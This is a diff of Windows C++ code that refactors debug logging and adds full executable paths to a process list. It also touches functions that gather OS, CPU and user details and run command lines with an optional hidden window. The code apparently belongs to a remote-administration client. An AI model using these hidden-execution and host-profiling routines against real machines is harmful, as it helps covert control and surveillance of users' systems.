@@ -51,28 +51,19 @@ std::string strUserName() {
 }
 
 std::string strOS() {
-	//os regedit
 	std::string strOut = "";
 	HKEY hKey;
 	auto ret = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_QUERY_VALUE, &hKey);
 	if (ret != ERROR_SUCCESS) {
-#ifdef ___DEBUG_
-		error();
-#endif
-		strOut = ":v";
+		DebugPrint("RegOpenKeyEx ERR");
 		return strOut;
 	}
 	LPBYTE lBuffer = (LPBYTE)malloc(50);
 	DWORD dLen = 50;
 	if (RegQueryValueEx(hKey, "ProductName", nullptr, nullptr, lBuffer, &dLen) == ERROR_SUCCESS) {
 		strOut.append((const char*)lBuffer);
-	}
-	else {
-#ifdef ___DEBUG_
-		std::cout << "Unable to retrieve product name\n";
-		error();
-#endif
-		//no se pudo oibtener el SO
+	}else {
+		DebugPrint("Unable to retrieve product name");
 		strOut = "Windows :v";
 	}
 	free(lBuffer);
@@ -103,9 +94,9 @@ std::string strCpu() {
 	int CPUInfo[4] = { -1 };
 	char CPUBrandString[200];
 	__cpuid(CPUInfo, 0x80000000);
-	unsigned int nExIds = CPUInfo[0];
+	u_int nExIds = CPUInfo[0];
 	memset(CPUBrandString, 0, sizeof(CPUBrandString));
-	for (unsigned int i = 0x80000000; i <= nExIds; ++i) {
+	for (u_int i = 0x80000000; i <= nExIds; ++i) {
 		__cpuid(CPUInfo, i);
 		if (i == 0x80000002) {
 			memcpy(CPUBrandString, CPUInfo, sizeof(CPUInfo));
@@ -160,9 +151,7 @@ u64 GetFileSize(c_char* cPath) {
 
 bool Execute(const char *cCmdLine, int iOpt){
 	if(iOpt == 0){
-#ifdef ___DEBUG_
-	std::cout<<"[OCULTO]"<<std::endl;
-#endif
+		DebugPrint("[EXEC] Oculto");
 	}
 	PROCESS_INFORMATION pi;
 	STARTUPINFO si;
@@ -177,10 +166,7 @@ bool Execute(const char *cCmdLine, int iOpt){
 	if(iRet != 0){
 		return true;
 	} else {
-#ifdef ___DEBUG_
-		std::cout<<"CreateProcess error\n";
-		error();
-#endif
+		DebugPrint("CreateProcess error");
 	}
 	SHELLEXECUTEINFO sei;
 	sei.cbSize = sizeof(SHELLEXECUTEINFO);
@@ -195,10 +181,7 @@ bool Execute(const char *cCmdLine, int iOpt){
 	if(ShellExecuteEx(&sei) > 32){
 		return true;
 	} else {
-#ifdef ___DEBUG_
-		std::cout<<"ShellExecuteEx error\n";
-		error();
-#endif
+		DebugPrint("ShellExecuteEx error");
 	}
 	if(WinExec(cCmdLine, iOpt == 1 ? SW_SHOW : SW_HIDE) > 31){
 		return true;
@@ -253,6 +236,22 @@ std::string strProcessList() {
 				strOut += cName;
 			}else {
 				strOut += "0";
+			}
+
+			HANDLE pHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pWPIs[i].ProcessId);
+			if (pHandle != NULL) {
+				TCHAR szFileName[MAX_PATH];
+				if(GetModuleFileNameEx(pHandle, NULL, szFileName, MAX_PATH) > 0){
+				//if(GetProcessImageFileNameA(pHandle, szFileName, sizeof(szFileName))> 0){
+					strOut += ">";
+					strOut += szFileName;
+				}else {
+					strOut += ">-";
+				}
+				CloseHandle(pHandle);
+				pHandle = NULL;
+			} else {
+				strOut += ">-";
 			}
 
 			strOut.append(1, '|');
